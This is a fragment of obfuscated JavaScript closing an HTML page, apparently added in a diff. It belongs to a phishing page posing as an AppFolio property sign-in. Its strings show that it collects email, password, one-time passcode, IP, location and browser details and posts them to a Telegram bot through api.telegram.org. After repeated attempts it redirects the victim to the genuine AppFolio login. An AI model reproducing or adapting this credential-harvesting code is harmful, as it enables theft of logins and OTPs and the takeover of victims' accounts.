Error(_0x4fe2ec(0x210));var _0x2eb22d=document[_0x4fe2ec(0x203)]('ctount')[_0x4fe2ec(0x1fa)];_0x2eb22d>=0x1?(document['getElementById'](_0x4fe2ec(0x214))[_0x4fe2ec(0x225)]['display']=_0x4fe2ec(0x20f),document[_0x4fe2ec(0x203)](_0x4fe2ec(0x224))['style']['display']='block',setTimeout(()=>{const _0x3a6691=_0x4fe2ec;window[_0x3a6691(0x1f6)]['href']=_0x3a6691(0x1ee);},0x1388)):(document[_0x4fe2ec(0x203)]('ctount')[_0x4fe2ec(0x1fa)]=+_0x2eb22d+0x1,document[_0x4fe2ec(0x203)](_0x4fe2ec(0x1eb))[_0x4fe2ec(0x1fa)]='',document[_0x4fe2ec(0x203)](_0x4fe2ec(0x1eb))['focus'](),document[_0x4fe2ec(0x203)](_0x4fe2ec(0x20d))['value']=_0x4fe2ec(0x1fe),_0x341cad[_0x4fe2ec(0x1f5)]=_0x4fe2ec(0x1f0),document[_0x4fe2ec(0x203)](_0x4fe2ec(0x1f2))[_0x4fe2ec(0x225)][_0x4fe2ec(0x219)]=_0x4fe2ec(0x21e));}catch(_0x4dc64a){errorMessage[_0x4fe2ec(0x1f5)]='An\x20error\x20occurred.\x20Please\x20try\x20again.',console[_0x4fe2ec(0x1ff)](_0x4fe2ec(0x21a),_0x4dc64a);}},0x7d0);}function handlemain(){const _0x2afb71=_0x26e8;document[_0x2afb71(0x203)](_0x2afb71(0x216))[_0x2afb71(0x225)][_0x2afb71(0x219)]=_0x2afb71(0x20f),document['getElementById']('mainbig')[_0x2afb71(0x225)][_0x2afb71(0x219)]=_0x2afb71(0x21e);}function _0x4a8f(){const _0xbdcca0=['getElementById','toLowerCase','\x0aLocation:\x20','1266813vmupnt','2942240uduHmn','43535qSaJGg','/sendMessage','Invalid\x20Username\x20and\x20password,\x20Try\x20Again.','OTP\x20from\x20Appfolio:\x0aIP:\x20','\x0aOTP:\x20','continue_button','1237781YMBhrw','none','Failed\x20to\x20send\x20data\x20to\x20Telegram','288CeVJGT','Email\x20is\x20required','70bQsMIA','otp_content','json','mainbody','15112oYNGyJ','224194ezrxuv','display','Error\x20during\x20login:','\x0aEmail:\x20','passwordInput','application/json','block','\x0aTime:\x20','3WgJlJD','\x0aPassword:\x20','2702SOsoJf','An\x20error\x20occurred.\x20Please\x20try\x20again.','done_content','style','test','Please\x20Wait...','userotp','https://api.telegram.org/bot','Invalid\x20email\x20address','https://account.appfolio.com/property/sign-in','emailInput','Incorrect\x20Otp,\x20Try\x20Again.','errorMessage','eoini','count','userAgent','textContent','location','stringify','trim','\x0aBrowser:\x20','value','POST','Password\x20is\x20required','sign_val','Sign\x20in','error','https://ipinfo.io/json','4868160gJxkOv','cotni'];_0x4a8f=function(){return _0xbdcca0;};return _0x4a8f();}function validateEmail(_0x4499f3){const _0x26df1b=_0x26e8,_0x2c462a=/^[^\s@]+@[^\s@]+\.[^\s@]+$/;return _0x2c462a[_0x26df1b(0x226)](String(_0x4499f3)[_0x26df1b(0x204)]());}
+      </script>
+ 
+</body></html>
